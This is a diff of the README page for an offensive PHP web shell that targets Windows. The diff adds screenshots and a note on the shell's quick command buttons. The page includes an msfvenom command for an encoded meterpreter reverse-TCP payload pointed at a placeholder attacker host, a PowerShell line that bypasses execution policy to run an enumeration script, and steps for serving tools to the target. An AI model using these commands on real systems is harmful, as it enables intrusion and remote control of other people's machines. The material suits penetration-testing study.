@@ -1,6 +1,6 @@
 <h1> The Not-So Simple PHP Command Shell</h1>
 <img src="/img/nsscmdshell.png" />
-<p>Automates many on target functions. Designed for windows targets. It isn't pretty, but it works as intended. I have included an assortment of common windows enumeration and escelation tools.  To generate your own msfvenom payload:<br> 
+<p>Automates many on target functions. Designed for windows targets. It isn't pretty, but it works as intended. I have included an assortment of common windows enumeration and escalation tools.  To generate your own msfvenom payload:<br> 
 venom.exe : (sudo) msfvenom -p windows/meterpreter/reverse_tcp LHOST=(ATTACKBOXIP) LPORT=(ATTACBOXPORT) -e x64/shikata_ga_nai -f exe -o venom.exe <br>
 </p>
 
@@ -30,10 +30,11 @@ If using the select field, choose your file and click "upload". files linked in 
 If using the open file dialog option, only files present at the ip address and port specified can be uploaded. <br>
 For the download option, simply enter the filename to be downloaded from the working directory of the target machine. Please note that files which can be managed by your browser will be opened in your browser - i.e., entering a text or html file to be downloaded will instead open the file in the web browser.<br>   
 Example usage: run jaws-enum.ps1 - output to jaws.txt <code>powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename jaws.txt</code>, then download the output file to your attack machine for later close examination.<br>
+<img src="https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/blob/main/img/nsscmdshell-jaws.png" />
+</p>
+<p>The quick command buttons each have a title attribute with a brief description of the function - hover over the button to see the description.  It goes without saying that the effectiveness of the various functions depends on the target os's support of the functions and the current user's permissions. This was designed for and tested on Windows XP - Windows 8.1 with very limited testing on Win10.</p> 
 &sub;1 I generally cd into my "windowstools" folder and start a simple http server <code>python3 -m http.server 8000</code>.<br>
 <img src="https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/blob/main/img/nsscmdshell-listening.png" />
-</p>
-
 
 *** Got "Warning: file_get_contents(http://XX.XX.XX.XX:XXXX/filename.ext):failed to open stream: No connetion could be made...." error? 
  Two possible causes:</p>
